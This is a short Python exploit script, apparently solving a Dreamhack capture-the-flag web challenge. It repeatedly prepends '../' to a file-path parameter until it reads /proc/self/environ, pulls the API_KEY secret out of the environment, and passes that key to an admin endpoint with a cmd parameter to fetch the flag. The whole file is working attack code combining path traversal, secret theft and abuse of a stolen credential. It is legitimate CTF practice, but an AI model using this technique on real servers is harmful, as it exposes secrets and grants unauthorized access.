import requests

port = 21881
url_index = f"http://host3.dreamhack.games:{port}/"
route = "proc/self/environ"
url_file = url_index + f"file?path={route}"

r = requests.get(url_file)
while "500" in r.text:
    route = "../" + route
    url_file = url_index + f"file?path={route}"
    r = requests.get(url_file)
start = r.text.find("API_KEY")
end = r.text.find("HOME")
api_key = r.text[start + len("API_KEY=") : end - 1]

cmd = "/flag"
url_admin = url_index + f"admin?API_KEY={api_key}&cmd={cmd}"
print(url_admin)
r = requests.get(url_admin)
print(r.text)
